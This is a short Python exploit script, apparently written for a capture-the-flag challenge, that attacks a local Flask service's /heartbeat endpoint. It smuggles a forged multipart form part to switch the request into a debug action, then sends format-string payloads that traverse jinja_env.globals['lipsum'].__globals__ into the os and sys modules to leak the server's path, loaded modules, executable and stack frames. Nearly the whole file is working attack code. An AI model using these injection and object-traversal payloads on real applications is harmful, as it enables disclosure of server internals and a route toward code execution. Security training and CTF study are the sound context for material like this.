import httpx

TARGET = "http://127.0.0.1:5000"
BOUNDARY = "---------------------------FlagBoundary123"

def format_string_leak(payload):
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    
    text = payload + fake_action_part
    params = {
        'text': text,
        'client': 'Content-Type',
        'token': f'multipart/form-data; boundary={BOUNDARY}'
    }
    
    r = httpx.post(f"{TARGET}/heartbeat", data=params, timeout=10.0)
    return r.text.strip()

# 探索 sys 模块
payloads = [
    # sys.path - 可能包含有用信息
    ('{0.jinja_env.globals[lipsum].__globals__[os].sys.path}', 'sys.path'),
    
    # sys.modules - 所有加载的模块
    ('{0.jinja_env.globals[lipsum].__globals__[os].sys.modules}', 'sys.modules'),
    
    # sys.executable
    ('{0.jinja_env.globals[lipsum].__globals__[os].sys.executable}', 'sys.executable'),
    
    # sys._getframe 可能有上下文
    ('{0.jinja_env.globals[lipsum].__globals__[os].sys._current_frames}', 'sys._current_frames'),
    
    # sys.stdin/stdout - 可能有文件描述符信息
    ('{0.jinja_env.globals[lipsum].__globals__[os].sys.stdin}', 'sys.stdin'),
]

for p, desc in payloads:
    try:
        result = format_string_leak(p)
        # 截断输出
        result = result[:5000] if len(result) > 5000 else result
        print(f"[{desc}]: {result}\n")
    except Exception as e:
        print(f"[{desc}]: Error - {e}\n")
